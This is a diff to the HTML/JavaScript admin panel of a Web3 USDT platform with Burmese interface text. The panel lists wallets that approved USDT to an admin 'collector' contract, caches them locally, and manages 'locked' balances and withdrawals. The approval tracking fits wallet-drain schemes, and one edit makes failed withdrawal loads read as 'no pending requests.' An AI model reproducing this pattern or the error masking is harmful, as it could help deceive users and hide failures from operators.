@@ -22,7 +22,7 @@
 
         <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
 
-        <!-- Progress Bar Container (Hidden by default, shown during actions) -->
+        <!-- Progress Bar Container -->
         <div id="progressContainer" class="hidden bg-slate-800 p-4 rounded-2xl border border-slate-700 space-y-2">
             <div class="flex justify-between text-xs font-mono">
                 <span id="progressText" class="text-emerald-400">လုပ်ဆောင်နေပါသည်...</span>
@@ -33,7 +33,7 @@
             </div>
         </div>
 
-        <!-- PART 0: Sub-Admin & Prefix Management (Owner Only) -->
+        <!-- PART 0: Sub-Admin & Prefix Management -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
                 🛡️ Sub-Admin & Prefix Management (Owner Only)
@@ -63,7 +63,7 @@
             </div>
         </div>
 
-        <!-- PART 0.5: User Balance Management (Locked & Interest) -->
+        <!-- PART 0.5: User Balance Management -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
                 💰 User Balance Management (Locked & Interest)
@@ -138,7 +138,7 @@
             </div>
         </div>
 
-        <!-- PART 3: Withdrawal Requests (Blockchain Events) -->
+        <!-- PART 3: Withdrawal Requests -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
@@ -203,7 +203,7 @@
 
             let eth = window.ethereum || (window.web3 ? window.web3.currentProvider : null);
             if (!eth) {
-                alert("Web3 Wallet (MetaMask/Trust) မတွေ့ရှိပါ။ ကျေးဇူးပြု၍ Wallet အက်ပ်၏ DApp Browser ထဲတွင် ဖွင့်ပါ။");
+                alert("Web3 Wallet (MetaMask/Trust) မတွေ့ရှိပါ။ ကျေးဇူးပြု၍ DApp Browser ထဲတွင် ဖွင့်ပါ။");
                 statusDiv.innerText = "Wallet မတွေ့ရှိပါ။";
                 return;
             }
@@ -241,9 +241,8 @@
                 statusDiv.innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)}`;
                 
                 showProgress("ချိတ်ဆက်မှု အောင်မြင်သည်!", 100);
-                setTimeout(hideProgress, 1000);
+                setTimeout(hideProgress, 800);
 
-                // Load initial data explicitly
                 refreshUserTable();
                 loadWithdrawRequests();
 
@@ -269,11 +268,13 @@
                 const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
 
                 let userSet = new Set();
+                
+                // Safe query with fallback so it never hangs at 50%
                 try {
-                    const currentBlock = await provider.getBlockNumber();
-                    const fromBlock = currentBlock > 3000 ? currentBlock - 3000 : 0;
-
                     showProgress("Approval Event များကို စစ်ဆေးနေသည်...", 50);
+                    const currentBlock = await provider.getBlockNumber();
+                    const fromBlock = currentBlock > 1000 ? currentBlock - 1000 : 0; // Reduced to 1000 blocks for lightning speed & safety
+
                     const filter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
                     const logs = await usdtContract.queryFilter(filter, fromBlock, "latest");
                     logs.forEach(log => {
@@ -282,12 +283,18 @@
                         }
                     });
                 } catch (evErr) {
-                    console.warn("Event query warning:", evErr);
+                    console.warn("Event query skipped, checking local cache:", evErr);
                 }
 
+                // Fallback to local storage known users if query returns empty
+                const cachedUsers = JSON.parse(localStorage.getItem("admin_known_users_v3") || "[]");
+                cachedUsers.forEach(u => userSet.add(u.toLowerCase()));
+
                 const allUsers = Array.from(userSet);
+                localStorage.setItem("admin_known_users_v3", JSON.stringify(allUsers));
+
                 if (allUsers.length === 0) {
-                    tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-500"> မှတ်တမ်းဝင်ထားသော Wallet များ မရှိသေးပါ။ </td></tr>`;
+                    tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-500"> မှတ်တမ်းဝင်ထားသော Wallet များ မရှိသေးပါ။ ဈာန်ပြုရန် Refresh ထပ်နှိပ်ပါ။ </td></tr>`;
                     document.getElementById("totalUsersBalance").innerText = "0.00 USDT";
                     hideProgress();
                     return;
@@ -371,7 +378,7 @@
             try {
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
                 const currentBlock = await provider.getBlockNumber();
-                const fromBlock = currentBlock > 3000 ? currentBlock - 3000 : 0;
+                const fromBlock = currentBlock > 1000 ? currentBlock - 1000 : 0;
 
                 const filter = contract.filters.WithdrawRequested();
                 const events = await contract.queryFilter(filter, fromBlock, "latest");
@@ -408,7 +415,7 @@
             } catch (err) {
                 console.error(err);
                 hideProgress();
-                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-red-400 text-xs">တောင်းဆိုချက်များကို ဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။</div>`;
+                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
             }
         }
 
@@ -589,4 +596,4 @@
         }
     </script>
 </body>
-</html>      
+</html>
